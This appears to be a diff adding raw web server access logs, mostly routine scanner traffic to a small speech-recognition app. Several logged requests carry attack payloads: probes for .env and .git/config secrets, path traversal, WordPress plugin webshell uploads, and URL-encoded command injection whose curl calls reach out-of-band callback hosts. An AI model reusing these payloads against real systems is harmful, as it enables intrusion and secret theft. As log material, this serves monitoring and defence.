+INFO:     ('85.237.234.227', 0) - "WebSocket /ws/speech/" [accepted]
+INFO:     connection open
+INFO:     connection closed
+INFO:     connection closed
+INFO:     ('85.237.234.227', 0) - "WebSocket /ws/speech/" [accepted]
+INFO:     connection open
+INFO:     connection closed
+INFO:     ('85.237.234.227', 0) - "WebSocket /ws/speech/" [accepted]
+INFO:     connection open
+Speech recognition stopped.
+Language changed to: cs-CZ
+Speech recognition stopped.
+Speech recognition stopped.
+Language changed to: cs-CZ
+Speech recognition stopped.
+Language changed to: cs-CZ
+INFO:     85.237.234.227:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     connection closed
+INFO:     ('85.237.234.227', 0) - "WebSocket /ws/speech/" [accepted]
+INFO:     connection open
+INFO:     connection closed
+WARNING:  Invalid HTTP request received.
+Speech recognition stopped.
+Language changed to: cs-CZ
+Speech recognition stopped.
+INFO:     40.124.175.52:38600 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     185.242.226.87:34592 - "GET / HTTP/1.1" 200 OK
+INFO:     185.242.226.87:47112 - "GET /app.ico HTTP/1.1" 200 OK
+INFO:     143.110.182.33:55982 - "GET /aaa9 HTTP/1.1" 200 OK
+INFO:     143.110.182.33:55996 - "GET /aab8 HTTP/1.1" 200 OK
+INFO:     143.110.182.33:56006 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     202.8.42.18:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     159.223.9.99:56972 - "GET / HTTP/1.1" 200 OK
+INFO:     159.223.9.99:56980 - "GET /login HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     184.105.139.70:52754 - "GET / HTTP/1.1" 200 OK
+INFO:     184.105.139.118:25293 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     184.105.139.90:24913 - "GET /?format=json HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     203.55.131.4:40640 - "GET / HTTP/1.1" 200 OK
+INFO:     203.55.131.4:37336 - "GET /app.ico HTTP/1.1" 200 OK
+INFO:     192.159.99.162:43512 - "GET / HTTP/1.1" 200 OK
+INFO:     205.210.31.20:57976 - "GET / HTTP/1.1" 200 OK
+INFO:     78.153.140.123:0 - "GET /api/.env.eski HTTP/1.0" 404 Not Found
+INFO:     78.153.140.123:0 - "GET /api/.env.dist HTTP/1.0" 404 Not Found
+INFO:     78.153.140.123:0 - "GET /api/.env.back HTTP/1.0" 404 Not Found
+INFO:     185.226.197.30:47767 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     167.94.138.45:40592 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.138.45:45106 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     167.94.138.45:45116 - "GET /favicon.ico HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     167.94.138.45:48322 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     167.94.138.45:48338 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     167.94.138.45:48354 - "GET /robots.txt HTTP/1.1" 200 OK
+INFO:     192.159.99.101:55086 - "GET / HTTP/1.1" 200 OK
+INFO:     204.76.203.30:0 - "GET /api/.env HTTP/1.0" 404 Not Found
+INFO:     78.153.140.203:0 - "GET /api/.env HTTP/1.0" 404 Not Found
+INFO:     147.185.132.115:61928 - "GET / HTTP/1.1" 200 OK
+INFO:     124.198.132.121:58580 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     193.174.89.19:35208 - "GET /metadata HTTP/1.1" 200 OK
+INFO:     193.174.89.19:35208 - "GET /r2/metadata HTTP/1.1" 200 OK
+INFO:     193.174.89.19:35208 - "GET /baseDstu3/metadata HTTP/1.1" 200 OK
+INFO:     193.174.89.19:35208 - "GET /r5/metadata HTTP/1.1" 200 OK
+INFO:     193.174.89.19:35208 - "GET /fhir/metadata HTTP/1.1" 200 OK
+INFO:     193.174.89.19:35208 - "GET /baseR5/metadata HTTP/1.1" 200 OK
+INFO:     193.174.89.19:35208 - "GET /fhir-server/api/v4/metadata HTTP/1.1" 200 OK
+INFO:     193.174.89.19:35208 - "GET /baseR4/metadata HTTP/1.1" 200 OK
+INFO:     193.174.89.19:35208 - "GET /baseR2/metadata HTTP/1.1" 200 OK
+INFO:     193.174.89.19:35208 - "GET /baseDstu2/metadata HTTP/1.1" 200 OK
+INFO:     193.174.89.19:35208 - "GET /r3/metadata HTTP/1.1" 200 OK
+INFO:     193.174.89.19:35208 - "GET /r4/metadata HTTP/1.1" 200 OK
+INFO:     193.174.89.19:35208 - "GET /baseR3/metadata HTTP/1.1" 200 OK
+INFO:     193.174.89.19:35228 - "GET /baseDstu2/metadata HTTP/1.1" 200 OK
+INFO:     193.174.89.19:35216 - "GET /fhir-server/api/v4/metadata HTTP/1.1" 200 OK
+INFO:     193.174.89.19:35304 - "GET /baseDstu3/metadata HTTP/1.1" 200 OK
+INFO:     193.174.89.19:35316 - "GET /baseR5/metadata HTTP/1.1" 200 OK
+INFO:     193.174.89.19:35274 - "GET /baseR3/metadata HTTP/1.1" 200 OK
+INFO:     193.174.89.19:35248 - "GET /r4/metadata HTTP/1.1" 200 OK
+INFO:     193.174.89.19:35242 - "GET /baseR2/metadata HTTP/1.1" 200 OK
+INFO:     193.174.89.19:35222 - "GET /baseR4/metadata HTTP/1.1" 200 OK
+INFO:     193.174.89.19:35294 - "GET /r2/metadata HTTP/1.1" 200 OK
+INFO:     193.174.89.19:35278 - "GET /r5/metadata HTTP/1.1" 200 OK
+INFO:     193.174.89.19:35258 - "GET /r3/metadata HTTP/1.1" 200 OK
+INFO:     193.174.89.19:35280 - "GET /fhir/metadata HTTP/1.1" 200 OK
+INFO:     3.131.215.38:59064 - "GET / HTTP/1.1" 200 OK
+INFO:     3.131.215.38:35316 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     198.235.24.251:65360 - "GET /.well-known/security.txt HTTP/1.1" 200 OK
+INFO:     18.97.19.193:53014 - "GET / HTTP/1.1" 200 OK
+INFO:     18.97.19.193:53022 - "GET /app.ico HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     195.154.56.80:0 - "GET /api/.env HTTP/1.0" 404 Not Found
+INFO:     64.227.183.144:45472 - "GET / HTTP/1.1" 200 OK
+INFO:     64.227.183.144:41700 - "GET /app.ico HTTP/1.1" 200 OK
+INFO:     198.235.24.209:64904 - "GET /.well-known/security.txt HTTP/1.1" 200 OK
+INFO:     87.244.204.169:0 - "GET /api/examples/?topics=%5B66%2C69%2C80%5D HTTP/1.0" 200 OK
+INFO:     87.244.204.169:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     147.185.132.69:62544 - "GET / HTTP/1.1" 200 OK
+INFO:     2.57.122.234:43706 - "GET /./doc/page/login.asp HTTP/1.1" 200 OK
+INFO:     185.247.137.192:51985 - "GET / HTTP/1.1" 200 OK
+INFO:     87.236.176.97:41699 - "GET /app.ico HTTP/1.1" 200 OK
+INFO:     45.142.154.100:47978 - "GET /api/v2/heartbeat HTTP/1.1" 404 Not Found
+INFO:     45.142.154.100:48172 - "GET / HTTP/1.1" 200 OK
+INFO:     45.142.154.100:48786 - "GET / HTTP/1.1" 200 OK
+INFO:     45.142.154.100:48998 - "GET /app.ico HTTP/1.1" 200 OK
+INFO:     45.142.154.100:49198 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     45.142.154.100:49394 - "GET /assets/index-AtzM99DZ.js HTTP/1.1" 200 OK
+INFO:     77.119.236.198:41458 - "GET / HTTP/1.0" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     91.231.89.1:52351 - "GET / HTTP/1.1" 200 OK
+INFO:     91.231.89.12:38479 - "GET /app.ico HTTP/1.1" 200 OK
+INFO:     198.199.122.217:60684 - "GET /.env HTTP/1.1" 200 OK
+INFO:     198.199.122.217:60690 - "GET /.git/config HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     162.243.22.118:34712 - "GET / HTTP/1.1" 200 OK
+INFO:     162.243.22.118:34724 - "GET /login HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     147.185.132.84:60024 - "GET / HTTP/1.1" 200 OK
+INFO:     198.235.24.46:57872 - "GET / HTTP/1.1" 200 OK
+INFO:     66.132.153.130:51370 - "GET / HTTP/1.1" 200 OK
+INFO:     66.132.153.130:51392 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     66.132.153.130:51410 - "GET /favicon.ico HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     66.132.153.130:51814 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     66.132.153.130:51838 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     66.132.153.130:54016 - "GET /wiki HTTP/1.1" 200 OK
+INFO:     194.165.16.11:60508 - "POST /cgi-bin/readycloud_control.cgi?1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111/api/users HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:60518 - "POST /wp-admin/admin-ajax.php HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:60528 - "POST /storfs-asup HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:60526 - "POST /wp-json/buddypress/v1/signup HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:60566 - "POST /run HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:60574 - "POST /ui/h5-vsan/rest/proxy/service/com.vmware.vsan.client.services.capability.VsanCapabilityProvider/getClusterCapabilityData HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:60588 - "POST / HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:60570 - "POST /upload HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:60542 - "POST /AdminService/urest/v1/LogonResource HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:60560 - "POST / HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:60592 - "POST /cgi-bin/mt/mt-xmlrpc.cgi HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:60602 - "POST /logupload?logMetaData=%7B%22itrLogPath%22%3A%20%22..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fhttpd%2Fhtml%2Fwsgi_log_upload%22%2C%20%22logFileType%22%3A%20%22log_upload_wsgi.py%22%2C%20%22workloadID%22%3A%20%222%22%7D HTTP/1.1" 403 Forbidden
+INFO:     65.49.20.66:7256 - "GET / HTTP/1.1" 200 OK
+INFO:     65.49.20.78:3155 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     65.49.20.102:5501 - "GET /?format=json HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     137.74.246.152:45078 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     204.76.203.30:0 - "GET /api/.env HTTP/1.0" 404 Not Found
+INFO:     78.153.140.179:0 - "GET /api/.env HTTP/1.0" 404 Not Found
+INFO:     194.165.16.11:51836 - "GET /%04%EF%BF%BD%7F%EF%BF%BD%18%EF%BF%BD%7F%EF%BF%BD%18%EF%BF%BD%7F%EF%BF%BD%08%EF%BF%BD%06%08%3B%7Bcurl%2Chttp%3A//d3qe7gf49vd8v4f7qkog5uesxybb367ag.oast.site%2B-H%2B%27User-Agent%3A%2BoaNRi4%27%7D%3B%04%EF%BF%BD%7F%EF%BF%BD%18%EF%BF%BD%7F%EF%BF%BD%18%EF%BF%BD%7F%EF%BF%BD%08%EF%BF%BD%06%08%3B%7Bcurl%2Chttp%3A//d3qe7gf49vd8v4f7qkog1fnb6srqbodgw.oast.site%2B-H%2B%27User-Agent%3A%2BoaNRi4%27%7D%3B?AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1" 200 OK
+INFO:     194.165.16.11:51842 - "GET /%04%EF%BF%BD%7F%EF%BF%BD%18%EF%BF%BD%7F%EF%BF%BD%18%EF%BF%BD%7F%EF%BF%BDd%EF%BF%BD%06%08%3B%7Bcurl%2Chttp%3A//d3qe7gf49vd8v4f7qkogtk743cbmg5ydz.oast.site%2B-H%2B%27User-Agent%3A%2BoaNRi4%27%7D%3B%04%EF%BF%BD%7F%EF%BF%BD%18%EF%BF%BD%7F%EF%BF%BD%18%EF%BF%BD%7F%EF%BF%BDd%EF%BF%BD%06%08%3B%7Bcurl%2Chttp%3A//d3qe7gf49vd8v4f7qkogsa9szdfgghyjt.oast.site%2B-H%2B%27User-Agent%3A%2BoaNRi4%27%7D%3B?AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1" 200 OK
+INFO:     3.137.73.221:54412 - "GET / HTTP/1.1" 200 OK
+INFO:     3.137.73.221:54422 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     85.237.234.7:0 - "GET /api/examples/?topics=%5B66%2C69%2C80%5D HTTP/1.0" 200 OK
+INFO:     85.237.234.7:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+WARNING:  Invalid HTTP request received.
+INFO:     194.165.16.11:47914 - "GET /nagiosxi/login.php HTTP/1.1" 200 OK
+INFO:     194.165.16.11:47928 - "GET /nagiosxi/login.php HTTP/1.1" 200 OK
+INFO:     194.165.16.11:47918 - "POST /mgmt/shared/authn/login HTTP/1.1" 403 Forbidden
+INFO:     85.237.234.7:0 - "GET /api/examples/?topics=%5B66%2C69%2C80%5D HTTP/1.0" 200 OK
+INFO:     85.237.234.7:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     205.210.31.25:64174 - "GET / HTTP/1.1" 200 OK
+INFO:     78.153.140.176:0 - "GET /api/.env HTTP/1.0" 404 Not Found
+INFO:     46.233.48.44:42819 - "GET / HTTP/1.0" 200 OK
+INFO:     205.210.31.57:62730 - "GET / HTTP/1.1" 200 OK
+INFO:     192.159.99.180:54914 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     194.165.16.11:46292 - "POST /wp-admin/admin-ajax.php HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:46308 - "GET /wp-content/uploads/workreap-temp/34HnpQ0gJQxdzH4Hr9xyJhZCXOo.php HTTP/1.1" 200 OK
+INFO:     194.165.16.11:46310 - "POST /wp-admin/admin-ajax.php?action=uploadFontIcon HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:46316 - "GET /wp-content/uploads/kaswara/fonts_icon/ttngme/ww.php HTTP/1.1" 200 OK
+INFO:     205.210.31.253:64844 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     107.170.27.225:51110 - "GET / HTTP/1.1" 200 OK
+INFO:     107.170.27.225:51120 - "GET /login HTTP/1.1" 200 OK
+INFO:     60.191.125.35:47318 - "HEAD / HTTP/1.1" 200 OK
+INFO:     178.62.51.155:45746 - "GET /.env HTTP/1.1" 200 OK
+INFO:     178.62.51.155:45762 - "GET /.git/config HTTP/1.1" 200 OK
+INFO:     194.165.16.11:59112 - "POST / HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:59126 - "POST / HTTP/1.1" 403 Forbidden
+INFO:     40.77.178.143:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+INFO:     71.6.146.186:45906 - "GET / HTTP/1.1" 200 OK
+INFO:     71.6.146.186:46044 - "GET /app.ico HTTP/1.1" 200 OK
+INFO:     78.153.140.178:0 - "GET /api/.env HTTP/1.0" 404 Not Found
+INFO:     78.153.140.178:0 - "GET /api/test HTTP/1.0" 404 Not Found
+INFO:     147.185.132.12:61370 - "GET / HTTP/1.1" 200 OK
+INFO:     146.190.134.221:40740 - "POST /api/client/update?arch=amd64&commit=08059e95dacafe0bf6e5782f8e2c8ec9cd8c5a17&os=windows HTTP/1.1" 404 Not Found
+INFO:     161.35.21.207:19875 - "GET / HTTP/1.0" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     164.92.233.38:31948 - "GET / HTTP/1.1" 200 OK
+INFO:     142.93.170.248:43172 - "GET /cgi-bin/authLogin.cgi HTTP/1.1" 200 OK
+INFO:     64.226.79.234:1668 - "GET /solr/admin/info/system HTTP/1.1" 200 OK
+INFO:     165.232.64.40:1106 - "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 200 OK
+INFO:     157.230.25.216:19848 - "GET /v2/_catalog HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     64.226.79.234:1682 - "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1" 200 OK
+INFO:     178.128.214.94:50734 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     178.128.214.94:50750 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     174.138.32.222:60094 - "GET / HTTP/1.1" 200 OK
+INFO:     194.165.16.11:58780 - "POST /druid/indexer/v1/sampler HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:58796 - "POST /webtools/control/SOAPService HTTP/1.1" 403 Forbidden
+INFO:     204.76.203.18:35104 - "GET / HTTP/1.1" 200 OK
+INFO:     78.153.140.203:0 - "GET /api/.env HTTP/1.0" 404 Not Found
+INFO:     204.76.203.18:37212 - "GET /bins/ HTTP/1.1" 200 OK
+INFO:     66.132.153.127:59126 - "GET / HTTP/1.1" 200 OK
+INFO:     66.132.153.127:59130 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     66.132.153.127:59150 - "GET /favicon.ico HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     66.132.153.127:59192 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     66.132.153.127:59200 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     66.132.153.127:37840 - "GET /sitemap.xml HTTP/1.1" 200 OK
+INFO:     204.76.203.18:35486 - "GET /bin/ HTTP/1.1" 200 OK
+INFO:     194.165.16.11:50196 - "GET /wp-content/plugins/wpcargo/includes/34HnpPxDqVa3uZhFv80ObAHq3ue.php HTTP/1.1" 200 OK
+INFO:     194.165.16.11:50198 - "GET /wp-content/plugins/wpcargo/includes/barcode.php?text=x1x1111x1xx1xx111xx11111xx1x111x1x1x1xxx11x1111xx1x11xxxx1xx1xxxxx1x1x1xx1x1x11xx1xxxx1x11xx111xxx1xx1xx1x1x1xxx11x1111xxx1xxx1xx1x111xxx1x1xx1xxx1x1x1xx1x1x11xxx11xx1x11xx111xx1xxx1xx11x1x11x11x1111x1x11111x1x1xxxx&sizefactor=.090909090909&size=1&filepath=34HnpPxDqVa3uZhFv80ObAHq3ue.php HTTP/1.1" 200 OK
+INFO:     194.165.16.11:50206 - "POST /wp-content/plugins/wpcargo/includes/34HnpPxDqVa3uZhFv80ObAHq3ue.php?1=var_dump HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:50216 - "POST /lucee/admin/imgProcess.cfm?file=/whatever HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:50226 - "POST /lucee/admin/imgProcess.cfm?file=/../../../context/34HnpOmPqQtV22oIVGMTPe7di3s.cfm HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:50238 - "POST /lucee/34HnpOmPqQtV22oIVGMTPe7di3s.cfm HTTP/1.1" 403 Forbidden
+INFO:     204.76.203.18:44138 - "GET /backup/ HTTP/1.1" 200 OK
+INFO:     185.189.182.234:53504 - "GET / HTTP/1.1" 200 OK
+INFO:     194.165.16.11:52436 - "GET /nagiosxi/login.php HTTP/1.1" 200 OK
+INFO:     198.235.24.211:63602 - "GET / HTTP/1.1" 200 OK
+INFO:     3.132.23.201:36706 - "GET / HTTP/1.1" 200 OK
+INFO:     3.132.23.201:35544 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     80.13.153.140:38259 - "GET / HTTP/1.0" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     118.193.35.202:50746 - "GET / HTTP/1.1" 200 OK
+INFO:     118.193.35.202:48022 - "GET /app.ico HTTP/1.1" 200 OK
+INFO:     118.193.35.202:48034 - "GET /robots.txt HTTP/1.1" 200 OK
+INFO:     118.193.35.202:48050 - "GET /sitemap.xml HTTP/1.1" 200 OK
+INFO:     118.193.35.202:48064 - "GET /config.json HTTP/1.1" 200 OK
+INFO:     118.193.35.202:48074 - "GET /sse HTTP/1.1" 200 OK
+INFO:     118.193.35.202:48084 - "GET /mcp HTTP/1.1" 200 OK
+INFO:     118.193.35.202:48100 - "GET /mcp-sse HTTP/1.1" 200 OK
+INFO:     118.193.35.202:51316 - "GET /update_weights_from_tensor HTTP/1.1" 200 OK
+INFO:     80.13.153.140:60826 - "GET / HTTP/1.1" 200 OK
+INFO:     80.13.153.140:39596 - "GET /owa/auth/logon.aspx HTTP/1.1" 200 OK
+INFO:     80.13.153.140:53132 - "GET /.git/index HTTP/1.1" 200 OK
+INFO:     80.13.153.140:37376 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     80.13.153.140:52978 - "GET /centreon/ HTTP/1.1" 200 OK
+INFO:     80.13.153.140:54894 - "GET /.well-known/security.txt HTTP/1.1" 200 OK
+INFO:     198.235.24.196:60004 - "GET / HTTP/1.1" 200 OK
+INFO:     64.62.197.212:63880 - "GET / HTTP/1.1" 200 OK
+INFO:     64.62.197.214:23201 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     64.62.197.226:27617 - "GET /?format=json HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     194.165.16.11:54974 - "POST /pages/templates2/viewpagetemplate.action HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:55040 - "POST /users/user-dark-features HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:54998 - "POST /template/custom/content-editor HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:55020 - "POST /pages/createpage.action?spaceKey=myproj HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:55070 - "POST /wiki/pages/createpage-entervariables.action?SpaceKey=x HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:55016 - "POST /wiki/pages/createpage-entervariables.action HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:55068 - "POST /confluence/pages/createpage-entervariables.action HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:55058 - "POST /pages/createpage-entervariables.action HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:55042 - "POST /pages/createpage-entervariables.action?SpaceKey=x HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:55002 - "POST /pages/doenterpagevariables.action HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:55036 - "POST /templates/editor-preload-container HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:54982 - "POST /pages/createpage-entervariables.action HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:55062 - "POST /confluence/pages/createpage-entervariables.action?SpaceKey=x HTTP/1.1" 403 Forbidden
+INFO:     198.235.24.77:59096 - "GET / HTTP/1.1" 200 OK
+INFO:     204.76.203.30:0 - "GET /api/.env HTTP/1.0" 404 Not Found
+INFO:     204.76.203.30:0 - "GET /api/test HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     34.78.183.19:43840 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     159.65.216.52:48572 - "GET / HTTP/1.1" 200 OK
+INFO:     159.65.216.52:48578 - "GET /login HTTP/1.1" 200 OK
+INFO:     52.82.120.67:50396 - "GET / HTTP/1.1" 200 OK
+INFO:     103.203.57.20:39290 - "GET / HTTP/1.1" 200 OK
+INFO:     178.128.232.15:52754 - "GET / HTTP/1.1" 200 OK
+INFO:     178.128.232.15:52758 - "GET /app.ico HTTP/1.1" 200 OK
+INFO:     198.235.24.157:64204 - "GET / HTTP/1.1" 200 OK
+INFO:     198.235.24.157:62084 - "GET / HTTP/1.1" 200 OK
+INFO:     205.210.31.212:63006 - "GET / HTTP/1.1" 200 OK
+INFO:     65.49.20.66:38038 - "GET / HTTP/1.1" 200 OK
+INFO:     65.49.20.126:43355 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     65.49.20.94:19093 - "GET /?format=json HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     147.185.132.30:65116 - "GET / HTTP/1.1" 200 OK
+INFO:     20.221.58.154:51758 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     35.153.167.66:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     87.239.52.154:44749 - "GET / HTTP/1.0" 200 OK
+INFO:     205.210.31.160:60240 - "GET / HTTP/1.1" 200 OK
+INFO:     162.142.125.216:34124 - "GET / HTTP/1.1" 200 OK
+INFO:     162.142.125.216:34130 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     162.142.125.216:34140 - "GET /favicon.ico HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     162.142.125.216:45614 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     162.142.125.216:45640 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     162.142.125.216:45674 - "GET /robots.txt HTTP/1.1" 200 OK
+INFO:     167.94.138.60:43658 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.138.60:34670 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.138.60:34680 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     167.94.138.60:34686 - "GET /favicon.ico HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     167.94.138.60:60036 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     167.94.138.60:60050 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     167.94.138.60:60076 - "GET /security.txt HTTP/1.1" 200 OK
+INFO:     66.132.153.117:60428 - "GET / HTTP/1.1" 200 OK
+INFO:     66.132.153.117:33012 - "GET / HTTP/1.1" 200 OK
+INFO:     66.132.153.117:33014 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     66.132.153.117:33042 - "GET /favicon.ico HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     66.132.153.117:33174 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     66.132.153.117:33200 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     66.132.153.117:33216 - "GET /security.txt HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
